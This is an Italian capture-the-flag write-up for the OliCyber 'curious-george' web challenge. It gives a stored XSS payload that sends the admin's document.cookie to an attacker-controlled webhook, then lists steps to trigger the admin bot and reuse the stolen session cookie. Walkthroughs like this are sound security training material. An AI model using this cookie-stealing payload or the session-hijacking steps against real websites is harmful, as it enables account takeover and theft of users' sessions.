
 - Creare un account e loggarsi
 - Copiare l'URL della vostra pagina (http://curious-george.challs.olicyber.it?id=your-id)
 - Cliccare su edit profile
 - Inserire il seguente payload (prendere l'URL da webhook.site, attenzione ad inserire l'URL giusto e non quello con dentro `#!`)
```html
<script>
window.location.href = "http://yourwebhook.site/?cookie=" + document.cookie
</script>
```
Questo payload ci permette di redirectare l'admin al nostro webhook, inserendo il suo cookie in un query parameter
 - Cliccare su "update"
 - Andare su http://curious-george.challs.olicyber.it/bug.php
 - Inserire l'URL della vostra pagina
 - Eseguire il file pow-modified.py e incollare sulla pagina /bug.php ciò che printa lo script python
 - Clicca submit
 - Sul webhook troveremo una richiesta simile:
   `http://webhook.site/3c132b32-cbda91f-bc329af-9f82c22?cookie=PHPSESSID=fshaonidmsaoceuwyqeiwq`
 - Prendere quel cookie e inserirlo al posto del cookie corrente (si può sostituire sia da webhook, sia dai DevTools)
 - Visitare http://curious-george.challs.olicyber.it/index.php
